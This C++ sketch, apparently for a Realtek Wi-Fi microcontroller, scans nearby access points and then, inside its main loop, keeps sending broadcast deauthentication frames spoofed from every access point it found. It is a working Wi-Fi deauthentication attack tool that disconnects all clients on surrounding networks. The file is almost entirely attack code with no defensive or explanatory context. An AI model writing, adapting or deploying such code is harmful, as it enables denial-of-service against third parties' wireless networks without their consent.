#include <WiFi.h>
#include <wifi_conf.h>
#include "wifi_cust_tx.h"

int n;
static uint8_t _networkCount;
static char nwSSID[WL_NETWORKS_LIST_MAXNUM][WL_SSID_MAX_LENGTH];
static uint8_t nwBSSID[WL_NETWORKS_LIST_MAXNUM][6];
static int32_t nwRSSI[WL_NETWORKS_LIST_MAXNUM];
static uint32_t nwEnc[WL_NETWORKS_LIST_MAXNUM];
static uint8_t nwChannel[WL_NETWORKS_LIST_MAXNUM];
static char nwMAC[WL_NETWORKS_LIST_MAXNUM][18];

static rtw_result_t wifidrv_scan_result_handler(rtw_scan_handler_result_t *malloced_scan_result) {
  rtw_scan_result_t *record;

  if (malloced_scan_result->scan_complete != RTW_TRUE) {
    record = &malloced_scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    if (_networkCount < WL_NETWORKS_LIST_MAXNUM) {
      strcpy(nwSSID[_networkCount], (char *)record->SSID.val);
      nwRSSI[_networkCount] = record->signal_strength;
      nwEnc[_networkCount] = record->security;
      nwChannel[_networkCount] = record->channel;
      memcpy(nwBSSID[_networkCount], record->BSSID.octet, sizeof(record->BSSID.octet));
      sprintf(nwMAC[_networkCount], "%02X:%02X:%02X:%02X:%02X:%02X",
              record->BSSID.octet[0], record->BSSID.octet[1], record->BSSID.octet[2],
              record->BSSID.octet[3], record->BSSID.octet[4], record->BSSID.octet[5]);
      _networkCount++;
    }
  }
  return RTW_SUCCESS;
}


static int8_t scanNetworks() {
  digitalWrite(LED_R, HIGH);
  uint8_t attempts = 5;
  _networkCount = 0;
  if (wifi_scan_networks(wifidrv_scan_result_handler, NULL) != RTW_SUCCESS) return WL_FAILURE;
  do delay(3000);
  while ((_networkCount == 0) && (--attempts > 0));
  digitalWrite(LED_R, LOW);
  return _networkCount;
}

void scanAPs(){
  Serial.println("Scanning available networks...");
  int n = scanNetworks();
  if (n == 0) {
    Serial.println("No networks found");
  } else {
    for (int network = 1; network < n; network++) {
      Serial.print(nwSSID[network]);
      Serial.print("\tSignal: ");
      Serial.print(nwRSSI[network]);
      Serial.print(" dBm");
      Serial.print("\tBand: ");
      if (nwChannel[network] < 14) Serial.print("2.4 Ghz");
      else Serial.print("5 Ghz");
      Serial.print("\tChannel: ");
      Serial.print(nwChannel[network]);
      Serial.print("\tMac: ");
      Serial.print(nwMAC[network]);
      Serial.println("");
    }
  }
  Serial.println("");
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_R, OUTPUT);
  while (!Serial);
  wifi_on(RTW_MODE_STA);
  scanAPs();
}

unsigned long previousMillis = 0;
void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= 60000) {
    previousMillis = currentMillis;
    scanAPs();
  }
  for (int i=0;i<_networkCount;i++){
    wext_set_channel(WLAN0_NAME, nwChannel[i]);
    wifi_tx_deauth_frame(nwBSSID[i], (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
    Serial.println(nwSSID[i]);
  }
}
